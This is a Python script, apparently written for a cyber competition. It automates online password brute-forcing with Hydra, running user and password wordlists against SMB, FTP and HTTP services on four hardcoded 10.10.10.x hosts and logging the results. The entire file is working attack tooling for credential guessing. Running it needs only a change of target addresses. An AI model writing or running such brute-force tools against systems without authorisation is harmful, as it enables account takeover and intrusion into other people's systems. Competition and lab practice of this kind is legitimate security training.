import subprocess

# txt files will have to be updated throughout the comp
USER_FILE = "users.txt"
PASS_FILE = "passwords.txt"
RESULT_FILE = "hydra_results.txt"

# Hardcoded Hydra-only targets: (ip, port, service)
TARGETS = [
    ("10.10.10.22", "445", "smb"),   # svc-smb-01
    ("10.10.10.101", "21", "ftp"),   # svc-ftp-01
    ("10.10.10.104", "80", "http"),  # svc-amazin-01 (basic web check only)
    ("10.10.10.105", "445", "smb"),  # svc-samba-01
]

def build_command(ip, protocol, port):
    cmd = [
        "hydra",
        "-L", USER_FILE,
        "-P", PASS_FILE,
        "-t", "4",
        "-w", "10",
        "-s", port,
        f"{protocol}://{ip}",
    ]
    return cmd

def main():
    for ip, port, service in TARGETS:
        command = build_command(ip, service, port)

        print("\nRunning:")
        print(" ".join(command))

        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        with open(RESULT_FILE, "a") as log:
            log.write(f"\n=== {ip} {service} {port} ===\n")

            for line in process.stdout:
                print(line, end="")
                log.write(line)

            process.wait()
            log.write(f"[exit_code] {process.returncode}\n")

if __name__ == "__main__":
    main()